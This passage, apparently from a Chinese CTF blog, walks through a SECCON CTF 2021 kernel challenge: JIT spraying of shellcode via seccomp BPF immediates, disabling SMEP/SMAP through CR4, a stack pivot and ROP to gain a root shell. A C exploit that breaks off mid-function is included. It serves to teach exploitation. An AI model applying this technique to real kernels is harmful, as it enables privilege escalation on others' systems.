class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span>        BPF_LD        0x00                    <span class="hljs-comment">//将值cp进寄存器</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>        BPF_LDX        0x01</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>        BPF_ST        0x02</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>        BPF_STX        0x03</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>        BPF_ALU        0x04</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>        BPF_JMP        0x05</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>        BPF_RET        0x06</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>        BPF_MISC        0x07</span><br></code></pre></td></tr></table></figure><p> 因此如果我们存入大量代码为 <code>[0x00, 0, 0, 0x90909090]</code>,那么他在内存当中进行jit编译后会呈现下面这种效果</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">b<span class="hljs-number">8 90 90 90</span> <span class="hljs-number">90</span>mov eax, <span class="hljs-number">0x90909090</span><br>b<span class="hljs-number">8 90 90 90</span> <span class="hljs-number">90</span>mov eax, <span class="hljs-number">0x90909090</span><br>...<br></code></pre></td></tr></table></figure><p>但这里如果说我们从汇编代码的第二项开始读指令会发生什么呢，他会变成</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">90</span> <span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-number">90</span> <span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-number">90</span> <span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-number">90</span> <span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">b8 </span>.<span class="hljs-keyword">byte </span><span class="hljs-number">0xb8</span><br><span class="hljs-number">90</span><br>...<br></code></pre></td></tr></table></figure><p>这里部分达到了一个错位指令的效果，但是这里的0xb8仍然是一个讨厌的地方，那么我们实际上可以选择牺牲一个立即数的位置来使得我们将0xb8翻译成一个新的指令，且该指令要尽量别改变环境当中的取值，如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">04</span> b8                   <span class="hljs-keyword">add</span>    <span class="hljs-built_in">al</span>, <span class="hljs-number">0xb8</span><br>0c b8                   <span class="hljs-keyword">or</span>     <span class="hljs-built_in">al</span>, <span class="hljs-number">0xb8</span><br><span class="hljs-number">14</span> b8                   <span class="hljs-keyword">adc</span>    <span class="hljs-built_in">al</span>, <span class="hljs-number">0xb8</span><br>1c b8                   <span class="hljs-keyword">sbb</span>    <span class="hljs-built_in">al</span>, <span class="hljs-number">0xb8</span><br><span class="hljs-number">24</span> b8                   <span class="hljs-keyword">and</span>    <span class="hljs-built_in">al</span>, <span class="hljs-number">0xb8</span><br>2c b8                   <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">al</span>, <span class="hljs-number">0xb8</span><br><span class="hljs-number">34</span> b8                   <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">al</span>, <span class="hljs-number">0xb8</span><br>3c b8                   <span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">al</span>, <span class="hljs-number">0xb8</span>    *<br>a8 b8                   <span class="hljs-keyword">test</span>   <span class="hljs-built_in">al</span>, <span class="hljs-number">0xb8</span>    *<br>b0 b8                   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">al</span>, <span class="hljs-number">0xb8</span>  <br>b1 b8                   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">cl</span>, <span class="hljs-number">0xb8</span><br>b2 b8                   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">dl</span>, <span class="hljs-number">0xb8</span><br>b3 b8                   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">bl</span>, <span class="hljs-number">0xb8</span><br>b4 b8                   <span class="hljs-keyword">mov</span>    <span class="hljs-number">ah</span>, <span class="hljs-number">0xb8</span><br>b5 b8                   <span class="hljs-keyword">mov</span>    <span class="hljs-number">ch</span>, <span class="hljs-number">0xb8</span><br>b6 b8                   <span class="hljs-keyword">mov</span>    <span class="hljs-number">dh</span>, <span class="hljs-number">0xb8</span><br>b7 b8                   <span class="hljs-keyword">mov</span>    <span class="hljs-number">bh</span>, <span class="hljs-number">0xb8</span><br></code></pre></td></tr></table></figure><p>这里直接引入了上面师傅博客当中的示例，其中找到的较为适合的字节就是0x3c，它同0xb8可以搭配成为 <code>cmp al, 0xb8</code>指令，十分适合我们的错位汇编，这样我们每次传入的立即数若带上0x3c就会达成以下效果</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">b8 3c <span class="hljs-number">90</span> <span class="hljs-number">90</span> <span class="hljs-number">90</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x3c909090</span><br>b8 3c <span class="hljs-number">90</span> <span class="hljs-number">90</span> <span class="hljs-number">90</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x3c909090</span><br>...<br><br>-------------------------------------------<br><br><span class="hljs-number">90</span> <span class="hljs-keyword">nop</span><br><span class="hljs-number">90</span> <span class="hljs-keyword">nop</span><br><span class="hljs-number">90</span> <span class="hljs-keyword">nop</span><br>3c b8 <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0xb8</span><br><span class="hljs-number">90</span> <span class="hljs-keyword">nop</span><br>...<br></code></pre></td></tr></table></figure><p>因此我们可以善用这里每条汇编多余的3字节来写入我们想要的shellcode，下面介绍例题</p><h2 id="例题：SECCON-CTF2021"><a href="#例题：SECCON-CTF2021" class="headerlink" title="例题：SECCON CTF2021"></a>例题：SECCON CTF2021</h2><p>首先查看README.md</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs dos">Added to `arch/x86/entry/syscalls/syscall_64.tbl`<br>```<br><span class="hljs-number">1337</span> <span class="hljs-number">64</span> seccon sys_seccon<br>```<br><br>Added to `kernel/sys.c`:<br>```c<br>SYSCALL_DEFINE1(seccon, unsigned long, rip)<br>&#123;<br>  asm volatile(&quot;xor <span class="hljs-variable">%%e</span>dx, <span class="hljs-variable">%%e</span>dx;&quot;<br>               &quot;xor <span class="hljs-variable">%%e</span>bx, <span class="hljs-variable">%%e</span>bx;&quot;<br>               &quot;xor <span class="hljs-variable">%%e</span>cx, <span class="hljs-variable">%%e</span>cx;&quot;<br>               &quot;xor <span class="hljs-variable">%%e</span>di, <span class="hljs-variable">%%e</span>di;&quot;<br>               &quot;xor <span class="hljs-variable">%%e</span>si, <span class="hljs-variable">%%e</span>si;&quot;<br>               &quot;xor <span class="hljs-variable">%%r</span>8d, <span class="hljs-variable">%%r</span>8d;&quot;<br>               &quot;xor <span class="hljs-variable">%%r</span>9d, <span class="hljs-variable">%%r</span>9d;&quot;<br>               &quot;xor <span class="hljs-variable">%%r</span>10d, <span class="hljs-variable">%%r</span>10d;&quot;<br>               &quot;xor <span class="hljs-variable">%%r</span>11d, <span class="hljs-variable">%%r</span>11d;&quot;<br>               &quot;xor <span class="hljs-variable">%%r</span>12d, <span class="hljs-variable">%%r</span>12d;&quot;<br>               &quot;xor <span class="hljs-variable">%%r</span>13d, <span class="hljs-variable">%%r</span>13d;&quot;<br>               &quot;xor <span class="hljs-variable">%%r</span>14d, <span class="hljs-variable">%%r</span>14d;&quot;<br>               &quot;xor <span class="hljs-variable">%%r</span>15d, <span class="hljs-variable">%%r</span>15d;&quot;<br>               &quot;xor <span class="hljs-variable">%%e</span>bp, <span class="hljs-variable">%%e</span>bp;&quot;<br>               &quot;xor <span class="hljs-variable">%%e</span>sp, <span class="hljs-variable">%%e</span>sp;&quot;<br>               &quot;jmp %<span class="hljs-number">0</span>;&quot;<br>               &quot;ud2;&quot;<br>               : : &quot;rax&quot;(rip));<br>  return <span class="hljs-number">0</span>;<br>&#125;<br>```<br><br></code></pre></td></tr></table></figure><p>题目并没有给出漏洞模块，这里添加了一个diy的系统调用，可以清空大量寄存器，然后修改rip为我们传入的参数值，</p><p>然后就是启动脚本</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#!/bin/sh</span><br>timeout --foreground <span class="hljs-number">300</span> qemu-system-x86_64 <span class="hljs-string">\</span><br>        -m <span class="hljs-number">64</span>M <span class="hljs-string">\</span><br>        -nographic <span class="hljs-string">\</span><br>        -kernel bzImage <span class="hljs-string">\</span><br>        -append <span class="hljs-string">&quot;console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on nokaslr&quot;</span> <span class="hljs-string">\</span><br>        -<span class="hljs-literal">no</span>-reboot <span class="hljs-string">\</span><br>        -cpu kvm64,+smap,+smep <span class="hljs-string">\</span><br>        -smp <span class="hljs-number">1</span> <span class="hljs-string">\</span><br>        -monitor /dev/<span class="hljs-literal">null</span> <span class="hljs-string">\</span><br>        -initrd rootfs.cpio <span class="hljs-string">\</span><br>        -net nic,model=virtio <span class="hljs-string">\</span><br>        -net user <span class="hljs-string">\</span><br>        -s<br><br></code></pre></td></tr></table></figure><p>发现开启KPTI、smep、smap，但是没有开启KASLR,所以内核中众多符号我们也都清楚，这里最开始想这利用ret2dir,但是发现这个栈不好迁移，因为只有最多3字节的额外汇编指令可以写入，无法达成 <code>mov rsp 0xffff8880xxxxxxxx</code>这种类似的写法，因此考虑了绕过smep&#x2F;smap然后将栈迁移到用户区这里</p><p>这里首先就是写入bpf汇编指令，我们可以查看prctl系统调用的手册：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">       PR_SET_SECCOMP (since Linux <span class="hljs-number">2.6</span><span class="hljs-number">.23</span>)<br>              Set <span class="hljs-keyword">the</span> secure computing (seccomp) mode <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> calling thread, <span class="hljs-built_in">to</span> limit <span class="hljs-keyword">the</span> available <span class="hljs-keyword">system</span> calls.  The more recent seccomp(<span class="hljs-number">2</span>) <span class="hljs-keyword">system</span> call provides <span class="hljs-keyword">a</span> superset <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> functionality <span class="hljs-keyword">of</span> PR_SET_SECCOMP,  <span class="hljs-keyword">and</span>  is<br>              <span class="hljs-keyword">the</span> preferred interface <span class="hljs-keyword">for</span> <span class="hljs-built_in">new</span> applications.<br><br>              The seccomp mode is selected via arg2.  (The seccomp constants are defined <span class="hljs-keyword">in</span> &lt;linux/seccomp.h&gt;.)  The following values can be specified:<br><br>...<br><br>              SECCOMP_MODE_FILTER (since Linux <span class="hljs-number">3.5</span>)<br>                     The  allowed  <span class="hljs-keyword">system</span>  calls are defined <span class="hljs-keyword">by</span> <span class="hljs-keyword">a</span> pointer <span class="hljs-built_in">to</span> <span class="hljs-keyword">a</span> Berkeley Packet Filter passed <span class="hljs-keyword">in</span> arg3.  This argument is <span class="hljs-keyword">a</span> pointer <span class="hljs-built_in">to</span> struct sock_fprog; <span class="hljs-keyword">it</span> can be designed <span class="hljs-built_in">to</span> <span class="hljs-built_in">filter</span> arbitrary <span class="hljs-keyword">system</span> calls <span class="hljs-keyword">and</span><br>                     <span class="hljs-keyword">system</span> call arguments.  See <span class="hljs-keyword">the</span> description <span class="hljs-keyword">of</span> SECCOMP_SET_MODE_FILTER <span class="hljs-keyword">in</span> seccomp(<span class="hljs-number">2</span>).<br><br>                     This operation is available only <span class="hljs-keyword">if</span> <span class="hljs-keyword">the</span> kernel is configured <span class="hljs-keyword">with</span> CONFIG_SECCOMP_FILTER enabled.<br></code></pre></td></tr></table></figure><p>这里看到我们的arg1和arg2、arg3都有对应要求，这里man手册贴心的推荐我们阅读seccomp(2)手册，依然继续跟进</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">SECCOMP_SET_MODE_FILTER<br>       The  system calls allowed are defined <span class="hljs-keyword">by</span> a pointer <span class="hljs-keyword">to</span> a Berkeley Packet Filter (BPF) passed via args.  This argument <span class="hljs-built_in">is</span> a pointer <span class="hljs-keyword">to</span> a struct sock_fprog; it can be designed <span class="hljs-keyword">to</span> filter arbitrary system calls <span class="hljs-built_in">and</span><br>       system <span class="hljs-keyword">call</span> arguments.  <span class="hljs-keyword">If</span> the filter <span class="hljs-built_in">is</span> invalid, seccomp() fails, returning EINVAL <span class="hljs-keyword">in</span> errno.<br><br>       <span class="hljs-keyword">If</span> fork(<span class="hljs-number">2</span>) <span class="hljs-built_in">or</span> clone(<span class="hljs-number">2</span>) <span class="hljs-built_in">is</span> allowed <span class="hljs-keyword">by</span> the filter, any child processes will be constrained <span class="hljs-keyword">to</span> the same system <span class="hljs-keyword">call</span> filters <span class="hljs-keyword">as</span> the parent.  <span class="hljs-keyword">If</span> execve(<span class="hljs-number">2</span>) <span class="hljs-built_in">is</span> allowed, the existing filters will be preserved across a<br>       <span class="hljs-keyword">call</span> <span class="hljs-keyword">to</span> execve(<span class="hljs-number">2</span>).<br><br>       <span class="hljs-keyword">In</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> use the SECCOMP_SET_MODE_FILTER operation, either the calling thread must have the CAP_SYS_ADMIN capability <span class="hljs-keyword">in</span> its user <span class="hljs-keyword">namespace</span>, <span class="hljs-built_in">or</span> the thread must already have the no_new_privs bit <span class="hljs-keyword">set</span>.  <span class="hljs-keyword">If</span> that<br>       bit was <span class="hljs-built_in">not</span> already <span class="hljs-keyword">set</span> <span class="hljs-keyword">by</span> an ancestor <span class="hljs-keyword">of</span> this thread, the thread must make the following <span class="hljs-keyword">call</span>:<br><br>           prctl(PR_SET_NO_NEW_PRIVS, <span class="hljs-number">1</span>);<br><br>       Otherwise, the SECCOMP_SET_MODE_FILTER operation fails <span class="hljs-built_in">and</span> returns EACCES <span class="hljs-keyword">in</span> errno.  This requirement ensures that an unprivileged process cannot apply a malicious filter <span class="hljs-built_in">and</span> <span class="hljs-keyword">then</span> invoke a <span class="hljs-keyword">set</span>-user-ID <span class="hljs-built_in">or</span> other<br>       privileged program <span class="hljs-keyword">using</span> execve(<span class="hljs-number">2</span>), thus potentially compromising that program.  (Such a malicious filter might, <span class="hljs-keyword">for</span> example, cause an attempt <span class="hljs-keyword">to</span> use setuid(<span class="hljs-number">2</span>) <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> the caller<span class="hljs-comment">&#x27;s user IDs to nonzero values to</span><br>       instead <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> without actually making the system <span class="hljs-keyword">call</span>.  Thus, the program might be tricked <span class="hljs-keyword">into</span> retaining superuser privileges <span class="hljs-keyword">in</span> circumstances <span class="hljs-keyword">where</span> it <span class="hljs-built_in">is</span> possible <span class="hljs-keyword">to</span> influence it <span class="hljs-keyword">to</span>  <span class="hljs-keyword">do</span>  dangerous  things<br>       because it did <span class="hljs-built_in">not</span> actually drop privileges.)<br><br><br></code></pre></td></tr></table></figure><p>其中提到我们若要使用该标志位需要调用线程的命名空间有着 <code>CAP_SYS_ADMIN</code>的标志，或者说线程将 <code>no_new_privs</code>位设置以下，其中也给出了范例： <code>prctl(PR_SET_NO_NEW_PRIVS, 1)</code></p><p>之后我们可以调试一下看看情况，下面是我们暂且写入的指令，可以看到就是一些雪橇</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">for(int i <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; BPF_PROG_LEN; i++)&#123;</span><br>    bpf_prog[i].code <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x00<span class="hljs-comment">;</span><br>    bpf_prog[i].jt <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>    bpf_prog[i].jf <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>    bpf_prog[i].k <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x3c909090<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="http://imgsrc.baidu.com/forum/pic/item/2fdda3cc7cd98d10f6020404673fb80e7bec9035.jpg"></p><p>因此我们可以大量布置雪橇滑块，然后在较后的代码当中写入我们的shellcode</p><p>shellcode的大致过程就是首先设置cr4绕过smep&#x2F;smap，然后栈迁移到用户区，然后打ROP即可，</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/5d6034a85edf8db1d0e674514f23dd54564e743e.jpg"></p><p>exp如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/bpf.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/filter.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_PROG_LEN 0x1780/8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SZ 4096</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREARE_KERNEL_CRED 0xffffffff81073c60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff81073ad0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE 0xffffffff81800e26</span><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">save_status</span><span class="hljs-params">()</span></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]Status has been saved....&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">get_shell</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">getuid</span>())&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x]not root&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">set_seccomp</span><span class="hljs-params">(<span class="hljs-type">char</span> *insn, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sock_fprog</span>&#123;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> len;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sock_filter</span> *filter;<br>    &#125;prog;<br>    prog.len = len;<br>    prog.filter = (<span class="hljs-keyword">struct</span> sock_filter *)insn;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">prctl</span>(PR_SET_NO_NEW_PRIVS, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;prepare prctl failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">prctl</span>(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;SET_SECCOMP&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">seccon</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rip)</span></span>&#123;<br>    <span class="hljs-built_in">syscall</span>(<span class="hljs-number">1337</span>, rip);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">debug</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Debugging here!&quot;</span>);<br>    <span class="hljs-built_in">getchar</span>();<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>&#123;<br>    <span class="hljs-type">size_t</span> *fake_stack;<br>    <span class="hljs-type">size_t</span> start;<br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sock_filter</span>* bpf_prog = (<span class="hljs-keyword">struct</span> sock_filter *)<span class="hljs-built_in">malloc</span>(BPF_PROG_LEN * <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> sock_filter));<br>    <span class="hljs-built_in">save_status</span>();<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; BPF_PROG_LEN; i++)&#123;<br>        bpf_prog[i].code = <span class="hljs-number">0x00</span>;<br>        bpf_prog[i].jt = <span class="hljs-number">0</span>;<br>        bpf_prog[i].jf 